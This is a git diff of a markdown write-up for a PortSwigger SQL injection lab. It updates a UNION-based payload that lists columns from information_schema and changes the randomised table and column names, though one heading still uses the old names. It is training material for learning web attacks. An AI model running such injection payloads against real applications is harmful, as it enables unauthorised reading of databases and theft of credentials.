@@ -63,16 +63,16 @@ We get list of all the available tables along with table name.
 #### List columns -
 
 ```sql
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_fhlhke'--
+SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_kdveix'--
 ```
 
 We get these columns
 
 ![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/2fcbb2e6e30041a29f5211cc782a063125df418d/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/Images/List%20Columns%20on%20Burpsuite.png)
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/3508c46627cd8023f41362f1f35f4a3a80d3258e/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/Images/List%20Columns%20on%20Webpage.png)
 
-columns - `username_yoqrkg` & `password_btqiad`
+columns - `username_xvncpg` & `password_djyube`
 
 #### Retreive information from the columns username_yoqrkg & password_btqiad from the table users_fhlhke -
 
